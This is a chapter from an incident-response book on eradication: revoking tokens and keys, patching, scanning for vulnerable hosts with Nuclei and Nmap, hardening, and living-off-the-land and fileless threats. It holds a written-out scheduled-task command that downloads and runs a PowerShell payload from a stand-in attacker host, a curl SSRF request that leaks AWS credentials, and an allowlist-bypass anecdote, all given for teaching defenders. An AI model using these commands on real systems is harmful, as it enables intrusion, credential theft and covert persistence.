THE FOUR-MONTH ZOMBIE ACCOUNT

A cybersecurity consultant shared a cautionary tale about the persistence of cached credentials and

long-lived tokens. [29]

Working as a contractor for a security-conscious organization, they used their

own laptop since the organization refused to provide one.

Eradicate Activity | Chapter 13 | 343

“After some initial logon issues, I (completely by accident) found I could access everything much

more quickly by bypassing their corporate VPN first.

The consultant continued working normally for months. Then came a security audit.

“After about ten months, I got security audited, and it turned out my account had been deactivated

by mistake four months earlier.

Four months of continued access to enterprise systems, despite the account being disabled. How was

this possible?

“My unwitting combination of full admin rights on my machine, cached credentials, and not signing

in via their VPN had allowed me to keep working despite, in theory, having zero access.

The organization believed it had strict access controls in place. They disabled the account through

their identity provider. But the combination of cached credentials on an unmanaged device,

bypassing the VPN enforcement point, and long-lived access tokens meant the revocation never took

effect.

This scenario illustrates why session and token revocation are essential during incident response.

Disabling an account or resetting a password addresses future authentication attempts, but does

nothing about existing sessions and cached credentials. An attacker with a compromised device in

this environment could maintain access for months after the organization believed it had revoked it.

Entra Connect and Directory Synchronization

If Entra Connect or another directory synchronization service is compromised, reset the synchronization

service account credentials and review the synchronization configuration for unauthorized changes.

Attackers who compromise directory synchronization can modify cloud identities, create backdoor

accounts for persistent access, or alter group memberships that propagate to the cloud environment. Verify

that synchronization rules have not been modified and that no unauthorized objects are being

synchronized.

Review the Entra Connect synchronization service account in the Entra admin center under Identity |

Hybrid management | Microsoft Entra Connect | Connect Sync . Reset the service account credentials and

verify the connector configuration. On the Entra Connect server, open the Synchronization Rules Editor to

review inbound and outbound synchronization rules for unauthorized modifications.

Session and Token Revocation

Modern authentication creates session tokens, refresh tokens, and OAuth grants that persist independently

of password changes. When a user authenticates through single sign-on, they receive tokens for each

connected application that may remain valid for hours, days, or indefinitely, depending on configuration.

Attackers who compromise accounts with SSO access can use stolen tokens to access connected

applications even after the password is changed. Browser sessions, OAuth tokens, personal access tokens,

and API keys all provide access paths that persist even after credential rotation. Comprehensive account

remediation requires revoking all active sessions and tokens associated with compromised accounts.

Revoke refresh tokens and active sessions through each identity provider in use. Most identity platforms

provide administrative capabilities to terminate all sessions for a specific user. This forces reauthentication

for all connected applications the next time they attempt to use stored tokens.

For applications that do not receive logout notifications from the identity provider, manually terminate

sessions through each application’s administrative interface. Prioritize applications that contain sensitive

data or provide access to critical infrastructure. Review the application inventory developed during the

investigation to ensure all connected applications are addressed.

OAuth Application and Consent Revocation

Attackers may have activated malicious OAuth applications that provide persistent access to user data and

connected services. These applications receive delegated permissions that remain valid even after password

changes and session termination.

Review OAuth applications authorized by compromised accounts and revoke any unauthorized consents.

Focus on applications with broad permissions such as mail access, file access, or administrative capabilities.

Legitimate-looking application names may mask malicious OAuth grants. Verify each application against

known authorized applications. Apply this process to all affected identity providers and SaaS platforms

involved with the incident.

For example, GitHub is a platform where third-party applications can provide persistent access through

OAuth grants. Attackers who create malicious GitHub applications and add them to repositories or

organization-level assets maintain persistent API access even after credential resets and token revocation.

Analysts should review GitHub app integrations (as shown in Figure 111) and the permissions and repository

access granted to each application (as shown in Figure 112 ) to identify and remove any unauthorized

applications.

Eradicate Activity | Chapter 13 | 345

Figure 111 | GitHub App Integration Example

Figure 112 | GitHub App Integration Permissions and Access

Personal Access Tokens and Long-Lived Credentials

Personal Access Tokens (PATs) and similar long-lived credentials are tied to individual user identities and

provide programmatic access to platforms and services. Unlike session tokens that expire relatively quickly,

PATs often remain valid for months or years, providing persistent access that survives password resets.

Common examples include GitHub and GitLab personal access tokens, AWS access keys associated with

IAM users, Azure user credentials, and Platform-as-a-Service (PaaS) tokens from vendors like Heroku,

Replit, and Render.

Attackers who obtain these credentials from compromised developer workstations or configuration files

can access resources as the compromised user without triggering re-authentication. These access paths

often have broad permissions, making them attractive for continued access to the environment.

Revoke all personal access tokens associated with compromised user accounts. Most platforms provide an

interface to list and revoke tokens. For example, GitHub users can review tokens under Settings | Developer

settings | Personal access tokens. For AWS IAM users, list and delete access keys associated with

compromised accounts, as shown in Listing 97.

Listing 97 | Revoking AWS IAM User Access Keys

$ aws iam list-access-keys --user-name gmurphy

{

"AccessKeyMetadata": [

{

"UserName": "gmurphy",

"AccessKeyId": "AKIA_SAMPLE_KEY_PLACEHOLDER",

"Status": "Active",

"CreateDate": "2025-12-02T20:30:56+00:00"

},

{

"UserName": "gmurphy",

"AccessKeyId": "AKIA_SAMPLE_KEY_PLACEHOLDER",

"Status": "Active",

"CreateDate": "2025-12-02T20:30:54+00:00"

}

]

}

$ aws iam delete-access-key --user-name gmurphy --access-key-id AKIA_SAMPLE_KEY_PLACEHOLDER

$ aws iam delete-access-key --user-name gmurphy --access-key-id AKIA_SAMPLE_KEY_PLACEHOLDER

$ aws iam list-access-keys --user-name gmurphy

{

"AccessKeyMetadata": [] 1

}

1 Confirms that all access keys have been deleted.

Table 30 provides equivalent commands for revoking cloud credentials across providers.

Table 30 | Cloud Credential Revocation Quick Reference

List credentials for a principal

AWS aws iam list-access-keys --user-name <user>

Azure az ad sp credential list --id <service-principal-id>

Eradicate Activity | Chapter 13 | 347

GCP gcloud iam service-accounts keys list --iam-account=<email>

Revoke or delete credentials

AWS aws iam delete-access-key --user-name <user> --access-key-id <key-id>

Azure az ad sp credential delete --id <service-principal-id> --key-id <key-id>

GCP gcloud iam service-accounts keys delete <key-id> --iam-account=<email>

Generate new tokens only after eradication is complete and the account is confirmed to be secure.

Browser-stored credentials present a particular challenge. Browsers maintain password managers,

authentication cookies, and session tokens that attackers can extract and use on other systems. Clear

browser profiles on compromised systems and consider requiring password changes for accounts whose

credentials were saved in affected browsers.

API Keys and Service Credentials

API keys and service credentials provide programmatic access to applications and services without being

tied to a specific user identity. These shared credentials are used for application-to-application

communication, webhook authentication, and service integrations. Because they are not associated with

individual users, they often have broad access and may not be subject to the same lifecycle management as

user credentials.

Common examples include application API keys for SaaS platforms, webhook authentication secrets,

database connection strings, service-to-service authentication tokens, and third-party integration

credentials. Azure service principals and GCP service account keys also fall into this category when used for

application authentication rather than individual user access.

Rotate all potentially compromised API keys through the appropriate management interface. For Azure

service principals:

Listing 98 | Rotating Azure Service Principal Credentials

PS C:\> Get-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2" 1

CustomKeyIdentifier :

EndDate            : 12/02/2026 05:41:17 PM

KeyId              : 3c8fcd5b-2c1d-4a96-90c9-5d9cd8f8ea21

StartDate          : 12/02/2025 05:41:17 PM

PS C:\> New-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2"

CustomKeyIdentifier :

EndDate            : 12/02/2027 05:44:02 PM

KeyId              : 9e5a7e8b-52af-4fc0-a2d3-cc91e0c6fa81

StartDate          : 12/02/2026 05:44:02 PM

SecretText         : tZp4K9Q~F8r1VdM2pJ7wHqL6xU3sN0Bg

PS C:\> Remove-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2" -KeyId

"3c8fcd5b-2c1d-4a96-90c9-5d9cd8f8ea21"

PS C:\>

1 Replace the UUID in this example with the pertinent service principal ObjectId.

Delete old keys only after new keys are deployed and validated in all dependent systems. Coordinate with

application teams to update configurations before deleting old credentials to avoid service interruption.

Targeted Removal vs. System Rebuild

Targeted artifact removal works well for straightforward compromises where responders can confidently

enumerate all attacker artifacts. However, sophisticated attacks may benefit from a different approach:

rebuilding systems from known-good sources rather than attempting to clean them in place. Rebuilding

provides greater confidence in complete eradication, but at the cost of more time and planning than

targeted removal.

In some incidents, rebuilding may be a faster, less-expensive option for eradication than

targeted removal techniques. Consider the investigation outcome, system criticality, and

available resources when choosing between these approaches.

The choice between targeted removal and a full rebuild depends on three important factors:

• Severity of compromise : Rootkits, kernel-mode malware, or firmware compromises require complete

rebuilds because these threats operate below the level where standard eradication tools can reach.

Less-severe compromises may be feasible to clean in place.

• System criticality: Production systems require careful coordination to minimize service interruptions,

affecting decision makers' downtime tolerance.

• Availability of clean sources : Backups and gold images should be available and verified to be clean

before a rebuild can proceed. Without clean recovery sources, rebuild options become limited.

Restoring from backup is one specific rebuild technique. It returns systems to a known-good state, but only

if the backup predates the compromise and is free of attacker artifacts. When selecting backups for this

purpose, responders should carefully analyze timelines and affected systems to ensure that backups are

clean. Choosing a backup that predates the compromise often means accepting some data loss for the

intervening period. The mechanics of managing that loss are part of the recover activity and are covered in

Chapter 14.

Vulnerability Remediation

Removing attacker artifacts addresses the symptoms of compromise, but the underlying vulnerability that

enabled initial access may still exist. Vulnerability remediation closes the security gaps that attackers

exploited, preventing subsequent compromise through the same attack vector.

Vulnerability remediation is essential to prevent an attacker from returning to the

environment after eradication is complete. Responders apply this step in the eradication

activity to ensure the vulnerability is addressed before recovery begins and to use the

Eradicate Activity | Chapter 13 | 349

insights gathered from the investigation to inform remediation efforts.

This section covers strategies for vulnerability remediation during eradication, including patch

management, addressing unpatchable systems, broader vulnerability assessment, and strengthening

security controls. During this activity, focusing efforts on the exploited vulnerabilities that led to the

incident is important. Considering other vulnerabilities in the environment is valuable, but should not

distract from remediating the root cause of the compromise.

Identifying Exploited Vulnerabilities

It is important to ensure that the response effort focuses on addressing the right vulnerabilities. Using the

evidence collected during the investigation, including root cause analysis, identify the vulnerabilities or

weaknesses that led to the incident. Prioritize vulnerabilities confirmed to have been exploited by the

attacker for remediation.

Vulnerabilities are associated with Common Vulnerabilities and Exposures (CVE) identifiers. Use CVE

identifiers to track and reference vulnerabilities in documentation, and to access vendor guidance on

patching or remediation advice. Vulnerability patching is not always straightforward or consistent: assess

vulnerabilities in the context of the organization’s specific environment and software versions.

When available, refer to threat intelligence sources for additional context about the exploited vulnerability.

While vendor advisories describe a vulnerability’s technical details, threat intelligence sources offer

additional insight into how attackers exploit it in the wild. For example, resources, including CISA’s Known

Exploited Vulnerabilities (KEV) catalog, provide additional context about actively exploited vulnerabilities,

including binding operational directive timelines for federal agencies. [30]

For example, consider the Fortinet FortiWeb vulnerability CVE-2025-64446: a path traversal vulnerability

that allows an attacker to execute administrative commands (such as disabling firewall rules) via specially

crafted HTTP requests. [31]

The CVE information published for this vulnerability includes technical details,

affected versions, and links to vendor patches, as shown in Figure 113. Further, the KEV entry for the CVE

confirms that the vulnerability is actively exploited with concise remediation guidance, as shown in Figure

114.

Figure 113 | FortiWeb CVE-2025-64446 Advisory Excerpt

Figure 114 | FortiWeb KEV Catalog Entry

Cyber threat intelligence sources can also provide additional details not otherwise publicly linked to CVE or

KEV reports. For example, one threat intelligence report on CVE-2025-64446 provides a link to a working

exploit for this vulnerability. Using GitHub Copilot AI integration, analysts can obtain additional intelligence

about the exploit’s functionality and IOCs, as shown in Figure 115 . This additional context can inform

Eradicate Activity | Chapter 13 | 351

detection and remediation efforts during eradication.

Figure 115 | GitHub’s Copilot IOC Analysis for FortiWeb Exploit

When the attack vector is a configuration weakness rather than a software vulnerability, review the specific

misconfiguration and the corrective action required. Configuration weaknesses may include overly

permissive firewall rules, default credentials, exposed management interfaces, missing security headers on

web applications, and more. Corrective efforts should focus on remediating the specific misconfiguration

that enabled the attack, while also addressing operational practices to prevent such misconfigurations in

the future.

Patch Management During Eradication

Apply security patches for exploited vulnerabilities as part of the eradication process. This is a

straightforward recommendation that will be intuitive for organizations, but there are important

considerations to ensure effective patching during incident response.

Test and Verify Before Broad Rollout: Every patch should be tested and verified prior to broad deployment.

Develop a documented procedure for applying and verifying the patch, including expected outcomes and

rollback steps if issues arise. Testing in a non-production environment helps identify compatibility issues

before they affect critical systems.

Track Patch Status with Inventory Management : Use inventory management to ensure that all systems

requiring remediation receive patches. Technology platforms such as configuration management databases

(CMDBs) or vulnerability scanners can help automate this documentation process. For organizations

without these tools, manual spreadsheets or other tracking mechanisms (simple lists, tickets, etc.) can

provide visibility into patch status across the environment. The goal is to maintain a clear record of which

systems have been patched and which still require remediation.

Balance Change Management with Speed : Use change management processes where possible, but many

organizations will benefit from prioritizing speed and risk reduction during incident response. A

vulnerability actively exploited against the organization poses an immediate risk that often justifies

expedited patching. Coordinate with decision makers to establish an appropriate risk tolerance for

bypassing standard change windows, and ensure the prepare activity has already identified who holds the

authority to approve these bypasses so that the question is not debated mid-incident. Document any

deviations from normal procedures for the incident record.

Consider Phased Rollout for Large Environments : For environments with many affected systems, consider

a phased rollout in which groups of systems are patched and verified before moving to the next group. This

approach identifies concerns or problems with patching early in the process before they affect all systems.

Start with lower-risk systems, when possible, to validate the patch before applying it to critical

infrastructure.

Verify System Functionality After Patching : Use system verification procedures to ensure systems

preserve needed functionality after patching. Coordinate with system owners to validate that patched

systems continue to operate correctly. Some patches may require configuration changes or application

updates to maintain compatibility. Document any issues encountered and their resolutions for future

consideration.

Addressing Unpatchable Systems

Some systems cannot be patched immediately due to end-of-life software, vendor constraints, or

operational dependencies. When patching is not feasible, organizations should implement compensating

controls to reduce risk until the system can be updated or replaced.

Network segmentation isolates vulnerable systems from potential attack sources. Place unpatchable

systems in dedicated network segments with strict network access control rules limiting inbound and

outbound connections to only required traffic. Monitor these segments closely for signs of exploitation

attempts.

Application-layer controls, such as web application firewalls, can block exploitation attempts for web-based

vulnerabilities. Deploy virtual patching rules that detect and block exploit traffic patterns specific to the

vulnerability. These controls provide temporary protection but should not replace permanent remediation

(see WAF Bypass Opportunities).

Enhanced monitoring increases visibility into potential exploitation attempts. While not a vulnerability

remediation measure, monitoring provides early warning if attackers attempt to exploit the vulnerability,

which can reduce future risk to the organization if analysts can quickly identify and respond to future

attacks. Configure logging and alerting for access to vulnerable services, unusual process execution, and

network connections associated with known exploit behavior.

Plan a timeline for permanent remediation via system upgrades, replacements, or migrations to supported

platforms. Communicate this timeline to stakeholders and track progress toward completion. Over time,

compensating controls can degrade in effectiveness as attackers develop new bypass techniques or as

organizational or technological changes in other platforms inadvertently weaken the controls. Additionally,

Eradicate Activity | Chapter 13 | 353

maintaining compensating controls requires ongoing effort and attention, diverting resources from other

security priorities. Treat unpatchable systems as technical debt that accumulates risk until permanently

addressed.

In regulated environments, an unpatchable system running with a known critical vulnerability often creates

a formal disclosure or risk-tracking obligation in addition to the technical risk. When the incident response

team discovers such a system that the organization did not previously know existed, the remediation

responsibility ends once compensating controls are in place. The system owner should then initiate the

organization’s internal risk-generation or risk-tracking process so the residual risk is recorded against the

appropriate business function rather than disappearing with the incident record.

Compensating controls should be applied as a temporary measure to mitigate

vulnerabilities, not as a permanent solution.

WAF BYPASS OPPORTUNITIES

Many organizations rely on Web Application Firewall (WAF) platforms to augment the security of

public-facing web applications. Using on-premises, cloud, or SaaS WAF solutions, organizations can

block common web application attacks such as SQL injection, cross-site scripting (XSS), and remote

file inclusion.

However, WAFs are not foolproof. A dedicated attacker with patience, time, and creativity can find

opportunities to exploit vulnerable systems despite WAF controls. Even widely-respected WAF

platforms like Cloudflare have a history of vulnerabilities that allow attackers to evade the WAF

protections:

• Parsing Discrepancy Evasion (2025): The research WAFFLED: Exploiting Parsing Discrepancies to

Bypass Web Application Firewalls demonstrated over 1,200 bypasses across multiple WAF

platforms, including Cloudflare, exploiting differences in how WAFs, proxies, and servers parse

HTTP data. [32]

• WAF bypass via XSS (2025): A write-up in 2025 showed that carefully obfuscated or non-standard

payloads could evade Cloudflare’s controls, yielding a successful reflected XSS attack. [33]

• Shared Infrastructure Attacks (2023) : CTI provider SOCRadar reported multiple Cloudflare

protection bypass vulnerabilities by using Cloudflare’s shared infrastructure to pivot attacks onto

protected applications. [34]

• JSON-based SQL payloads (2022) : Attackers embedded SQL injection attacks within JSON

payloads to evade detection. [35]

WAF systems provide valuable protection, notably through enhanced threat reporting, automated

integration of CTI data to block known bad IPs, and mitigation of common web application attacks.

However, organizations should not rely solely on WAFs to protect vulnerable web applications.

Attackers can and do find ways to bypass WAF protections, especially when motivated by valuable

targets.

Broader Vulnerability Assessment

When remediating an exploited vulnerability, consider the broader environment for similar vulnerabilities.

The vulnerability exploited in the incident may not be unique to the compromised system. Other systems

running the same software version may also be vulnerable to the same attack. Expand remediation beyond

systems directly involved in the incident to all systems with the same vulnerability.

Use vulnerability scanning tools to identify all instances of the vulnerable software across the environment.

Commercial vulnerability scanners, open-source platforms such as Greenbone (which includes OpenVAS),

or agent-based scanning via EDR platforms can identify other vulnerable systems that should also be

remediated.

Open-source vulnerability scanning tools such as Nuclei can use vulnerability identifiers to scan for

additional vulnerable targets. Nuclei uses a YAML-based template system to define vulnerability checks,

making it easy to create custom checks for specific CVEs.

For example, consider a scenario in which a network-attached camera is vulnerable to a Server-Side

Request Forgery (SSRF), where specific HTTP requests can access internal network resources, disclosing

sensitive information. In this example, an attacker can access a specific endpoint on the IP cameras ( /fetch)

with the url parameter to trigger the SSRF vulnerability and access other resources on behalf of the camera.

Using the SSRF vulnerability, an attacker can access an internal administrative page that returns

configuration details, including AWS credentials stored in the camera’s configuration for saving video

footage to an S3 bucket, as shown in Listing 99.

Listing 99 | IP Camera SSRF Vulnerability Discloses AWS Credentials

$ curl -s "http://192.168.1.140/fetch?url=http://127.0.0.1/internal-admin"

{

"content_length": 169,

"content_preview": "{\n  \"AccessKeyId\": \"AKIA_SAMPLE_KEY_PLACEHOLDER\",\n  \"SecretAccessKey\":

\"noZxEDKgd7LsLJTyMMt3BJH/Wh5XqVKaeAG+mtXq\",\n  \"Status\": \"Active\",\n  \"UserName\":

\"cameralogic-s3export\"\n}\n", 1

"status_code": 200,

"url": "http://127.0.0.1/internal-admin"

}

1 A web server response to accessing the /internal-admin page discloses configuration settings, including AWS credentials.

To identify other vulnerable IP cameras on the network, create a custom Nuclei template that checks for

the presence of the vulnerable endpoint and parameter, as shown in Listing 100.

Listing 100 | Nuclei Template for IP Camera SSRF Vulnerability Test

id: ssrf-url-fetcher

info:

name: SSRF in CameraLogic URL Fetcher Endpoint

author: Joshua Wright

severity: high

tags: ssrf

http:

- method: GET

path:

- "{{BaseURL}}/fetch?url=http://127.0.0.1/internal-admin" 1

Eradicate Activity | Chapter 13 | 355

matchers:

- type: word

words: 2

- "AccessKeyId"

- "SecretAccessKey"

1 The vulnerable endpoint and parameter to test for SSRF where BaseURL is replaced with the target IP address or hostname

2 Strings expected in the response disclosing AWS key information if the vulnerability is present.

With the template saved in a file (e.g., ssrf-url-fetcher.yaml), run Nuclei against a list of target IP addresses

to identify other vulnerable cameras, as shown in Listing 101.

Listing 101 | Nuclei Scan for Vulnerable IP Cameras

$ nuclei -t ssrf-url-fetcher.yaml -list hosts-to-scan.txt

__     _

____  __  _______/ /__  (_)

/ __ \/ / / / ___/ / _ \/ /

/ / / / /_/ / /__/ /  __/ /

/_/ /_/\__,_/\___/_/\___/_/   v3.5.1

projectdiscovery.io

[INF] nuclei-templates are not installed, installing...

[INF] Successfully installed nuclei-templates at /root/nuclei-templates

[INF] Supplied input was automatically deduplicated (1 removed).

[WRN] Loading 1 unsigned templates for scan. Use with caution.

[INF] Current nuclei version: v3.5.1 (latest)

[INF] Current nuclei-templates version: v10.3.4 (latest)

[INF] New templates added in latest release: 0

[INF] Templates loaded for current scan: 1

[INF] Targets loaded for current scan: 27

[INF] Running httpx on input host

[INF] Found 8 URL from httpx

[ssrf-url-fetcher] [http] [high] http://172.16.40.20/fetch?url=http://127.0.0.1/internal-admin

[ssrf-url-fetcher] [http] [high] http://192.168.1.140/fetch?url=http://127.0.0.1/internal-admin

[INF] Scan completed in 557.642459ms. 2 matches found.

1 Nuclei output showing a vulnerable IP camera at 172.16.40.20

Vulnerability scanning is a valuable tool for identifying other systems that may share the same vulnerability

exploited during the incident. By expanding remediation beyond the systems directly involved in the

compromise, responders reduce the risk of subsequent attacks through the same vulnerability on other

systems in the environment.

Configuration Hardening

Vulnerability remediation is not limited to patching software flaws. System misconfigurations often

contribute to attack success by providing attackers with opportunities they would not have on hardened

systems. Consider which opportunities exist to apply configuration hardening during the eradication action,

based on security baselines and lessons learned from the incident.

Vulnerability remediation should cover all the supporting elements that led to the incident,

not software patching alone.

Harden System Configurations

In Section 7.2.3.3, we looked at the preparation activity for applying CIS benchmarks and other hardening

guides. [36]

In the eradication waypoint, responders should revisit these processes to ensure that the

hardening guides have been applied to the extent possible based on the investigation findings and the needs

of the organization.

For many organizations, system configuration hardening is completed during initial system deployment.

System updates, configuration changes, and new features introduced with product updates can, over time,

expand the attack surface for devices. During eradication, review system configurations to ensure that

hardening measures remain in place and that no new weaknesses have been introduced.

Enumerate Accessible Services

Port scan systems to enumerate open services and identify unnecessary exposure. Consider a network

perspective when performing this step: scanning from an internal network segment reveals different

services than scanning from an external perspective. Compare results against documented service

requirements to identify services that should be disabled or restricted. Pay particular attention to

management interfaces, legacy protocols, and services that were not intentionally exposed.

To enumerate accessible services, use tools like Nmap to perform comprehensive port scans. For example,

the Nmap command in Listing 102  scans a target system for open TCP ports and attempts to identify

running services through version enumeration, providing insight into the accessible services on the target.

Alternatively, vulnerability scanning platforms can provide similar service enumeration capabilities as part

of their scanning process.

Listing 102 | Nmap Service Enumeration Example

$ sudo nmap -p 1-65535 -sV 192.168.1.119

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-04 06:29 -0500

Nmap scan report for 192.168.1.119

Host is up (0.0054s latency).

Not shown: 65528 closed tcp ports (reset)

PORT      STATE SERVICE       VERSION

22/tcp    open  ssh           OpenSSH 9.9 (protocol 2.0) 1

88/tcp    open  kerberos-sec  Heimdal Kerberos (server time: 2025-12-04 11:30:16Z)

2222/tcp  open  EtherNetIP-1?

5000/tcp  open  rtsp

5900/tcp  open  vnc           Apple remote desktop vnc 2

7000/tcp  open  rtsp

Eradicate Activity | Chapter 13 | 357

49185/tcp open  unknown

2 services unrecognized despite returning data. If you know the service/version, please submit

the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

[...]

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds

1 Nmap output indicates that an SSH remote access service is running on port 22.

2 Nmap output indicates that a VNC remote access service is running on port 5900.

As an alternative to port scanning, which can be taxing on network resources or introduce risk of service

disruption, review local listening services on each system. For Windows systems, use PowerShell Get-

NetTCPConnection and Get-NetUDPEndpoint cmdlets to enumerate listening TCP and UDP ports, as shown in

Listing 103. For Linux systems, use ss -tuln or netstat -tuln commands to list listening services. On macOS

systems, use lsof -i -n -P | grep LISTEN.

Listing 103 | PowerShell Listening Services Example

PS C:\> Get-NetTCPConnection -State Listen | Select-Object -Property

LocalAddress,LocalPort,OwningProcess,@{Name='ProcessName'; Expression={(Get-Process -Id

$_.OwningProcess).ProcessName}} 1

LocalAddress    LocalPort OwningProcess ProcessName

------------    --------- ------------- -----------

::                  20718           676 services

::                   1540          2348 spoolsv

::                   1539          1096 svchost

::                   1538          1200 svchost

::                   1537           540 wininit

::                   1536           684 lsass

::                    445             4 System

::                    135           916 svchost

0.0.0.0             20718           676 services

0.0.0.0              9001          5896 nginx 2

0.0.0.0              5040          5056 svchost

0.0.0.0              1540          2348 spoolsv

0.0.0.0              1539          1096 svchost

0.0.0.0              1538          1200 svchost

0.0.0.0              1537           540 wininit

0.0.0.0              1536           684 lsass

192.168.171.143       139             4 System

0.0.0.0               135           916 svchost

1 A PowerShell command retrieves listening TCP ports and the associated process names.

2 PowerShell output indicates that the Nginx web server is listening on port 9001.

Enumerating accessible services on each system provides a more accurate view of the services that could

expose systems, but requires access to each system individually and coordination to collect and review the

results.

Review Network Device Configurations

Review the configuration of network devices, including firewalls, routers, and switches, to ensure that

access controls align with the principle of least privilege. Poor change management practices often lead to

overly permissive rules that unnecessarily expose systems. Firewall rules may accumulate over time as

temporary exceptions become permanent, or as rules are added without removing obsolete entries.

For example, consider the FortiGate firewall policy in Listing 104 . In this configuration, a Virtual IP (VIP)

object exposes an internal web server on port 8080 to the public internet via port 11111 on a public IP

address. Replicated from a customer’s environment, this configuration was no longer needed but remained

active, exposing the internal web server to potential attack from the internet.

Listing 104 | FortiGate Firewall Policy Example

FGT-Edge # show firewall vip

config firewall vip

edit "WEBSERVER-8080" 1

set uuid 7a3d9f2e-4b8c-51ef-a6d2-8c4e7f1b3a5d

set extip 45.60.31.34 2

set extintf "wan1"

set portforward enable

set mappedip "10.10.10.10"

set extport 11111 3

set mappedport 8080

next

end

FGT-Edge # show firewall policy 15

config firewall policy

edit 15

set uuid 2f8a1c4d-6e9b-47d3-b5f1-9a2c8d4e6f7a

set name "Allow-WEBSERVER-8080"

set srcintf "wan1"

set dstintf "internal"

set action accept

set srcaddr "all" 4

set dstaddr "WEBSERVER-8080"

set schedule "always"

set service "TCP-11111"

set logtraffic all

set nat enable

next

end

1 Virtual IP (VIP) object exposing an internal service.

2 The VIP maps the public IP.

3 External port exposed to the public network.

4 The configuration allows any external IP to reach the internal server.

Review access controls to limit the exposure of critical systems. Remove rules that are no longer required

and restrict overly broad allow rules.

Eradicate Activity | Chapter 13 | 359

Disable Unnecessary Services

Disable unnecessary services and protocols that attackers commonly exploit. Remote access services, in

particular, should be limited to those required for business operations. Services such as Telnet, FTP, RDP,

and SMB are frequently targeted by attackers and should be disabled unless explicitly required. Where

remote access is required, use secure alternatives such as SSH or VPNs with multi-factor authentication.

After hardening, update the configuration management database (CMDB) and submit the corresponding

change control records so that the new baseline is the authoritative reference for the affected systems.

Without this step, routine operations work often re-enables the settings that were turned off during

eradication, either because the change never made it into the CMDB or because the team making later

changes is working from stale documentation.

ERADICATION CHALLENGES

Modern attacks present unique challenges that complicate eradication efforts. These challenges will often

combine in incidents, creating complex eradication scenarios that require multiple iterations through the

DAIR response actions loop. Understanding these challenges helps responders anticipate difficulties and

plan appropriate countermeasures.

In this section, we’ll address four recurring challenges: living-off-the-land techniques that abuse legitimate

system tools, fileless malware that operates from memory without leaving disk artifacts, legitimate remote

monitoring and management software repurposed by attackers, and threats that cross trust boundaries

between organizations and their suppliers or service providers.

Living Off the Land

Attackers increasingly use legitimate system tools (Living Off the Land Binaries, Scripts, and Libraries,

colloquially referred to as LOLBins), making it more difficult to distinguish malicious activity from normal

activity. PowerShell, WMI, Windows Scripting Host, even built-in and third-party utilities all represent an

opportunity for attackers to carry out their attack goals.

Eradication challenges arise because responders cannot simply delete PowerShell, WMI, or other essential

system tools since they are required for legitimate operations. Base64-encoded PowerShell commands

executing from memory leave minimal forensic artifacts, making traditional file-based eradication

ineffective. Legitimate administrative activity may look identical to attacker activity, complicating the

identification of malicious actions.

Mitigation approaches focus on behavioral detection rather than artifact-based detection to identify

malicious use of legitimate tools. Monitor for suspicious PowerShell usage patterns, including encoded

commands, unusual command-line arguments, or execution from unexpected parent processes. Implement

PowerShell logging and constrained language mode (CLM) where appropriate to limit attacker capabilities

while maintaining necessary functionality. Use application allowlisting to control script execution,

permitting only authorized scripts to run.

THIRD-PARTY LOLBIN ACCESS

In a recent penetration test, my team gained access to a Virtual Desktop Infrastructure (VDI)

environment through compromised user credentials. With access to the VDI, we sought

opportunities to move laterally into the broader cloud environment and to attack the Azure

infrastructure in use. However, attempts to run common tools were blocked by endpoint protection

controls.

Figure 116 | Blocked Executable Alert

To assess the platform restrictions, we generated a list of programs in a Windows batch script and

attempted to execute each one. This approach generated a lot of alerts in the endpoint protection

system, but eventually we discovered that python.exe was allowed to run. Although Python was not

installed on the VDI system, the policy was permissive enough to allow execution of the binary. This

permitted us to manually copy a Python installation tree to the VDI and run Python scripts. With the

ability to run Python scripts, we had a powerful toolset to interact with the system and network,

bypassing many of the restrictions imposed by the endpoint protection system.

When we think about LOLBins, we often focus on built-in operating system tools like PowerShell,

WMI, csc.exe, and others. Indeed, these tools are commonly used by attackers to evade detection.

However, third-party applications authorized to run in the environment can also serve as LOLBins.

Even if not installed by default, an attacker who can enumerate the environment policy may be able

to identify third-party applications that are allowed to run and leverage them for malicious purposes.

Defenders should audit application allowlist policies to identify any third-party applications that

provide scripting or code-execution capabilities. These tools provide powerful capabilities that can

render application allowlisting ineffective if not properly controlled.

Fileless Malware

Memory-resident threats leave minimal artifacts on disk, complicating traditional eradication approaches

that focus on files. Malware may execute entirely in memory through PowerShell scripts, injected code, or

process hollowing.

For example, using the Windows task scheduler ( schtasks.exe), an attacker can create a persistence

mechanism that runs PowerShell for a given event (such as a failed login attempt) to download and execute

Eradicate Activity | Chapter 13 | 361

a payload entirely in memory, as shown in Listing 105. The PowerShell command uses Invoke-WebRequest to

download a script from a remote server and executes it directly in memory using IEX (Invoke-Expression),

avoiding any files being written to disk, and allowing the attacker to remotely update the payload as needed

to meet their attack goals.

Listing 105 | Windows Scheduled Task Fileless Persistence Example

C:\> schtasks /create /tn \"Windows Security Audit\" /tr \"powershell.exe -WindowStyle Hidden

-ExecutionPolicy Bypass -Command \\\"IEX ([System.Text.Encoding]::UTF8.GetString((Invoke-

WebRequest -Uri 'http://attackerc2.tld/payload.ps1' -UseBasicParsing).Content))\\\"\" /sc

onevent /ec Security /mo \"*[System[EventID=4625]]\" /ru SYSTEM /f 1

SUCCESS: The scheduled task "Windows Security Audit" has successfully been created.

1 Create a scheduled task that runs PowerShell to download and execute a script in memory on failed login events; the

attacker script is hosted on the attackerc2.tld web server as payload.ps1

While investigation techniques to identify persistence through scheduled tasks will find this artifact,

determining what the attacker’s remote PowerShell script does requires additional information, such as

detailed system monitoring or PowerShell script execution logging.

Because fileless malware artifacts reside in memory, rebooting a system can remove the current malware

threat. However, if the persistence mechanism remains, the malware can be reloaded into memory,

requiring additional remediation effort. When dealing with fileless malware, responders need to identify and

remove persistence mechanisms as part of the eradication process to prevent subsequent attacker access.

Legitimate Remote Monitoring and Management Tool Investigation

Attackers increasingly leverage legitimate remote monitoring and management (RMM) tools such as

TeamViewer, AnyDesk, and ConnectWise ScreenConnect to maintain persistent access to compromised

environments. Unlike custom malware, these tools have valid digital signatures, established network traffic

patterns, and may already be permitted by security controls. The result is persistent access that appears

identical to legitimate IT support activity.

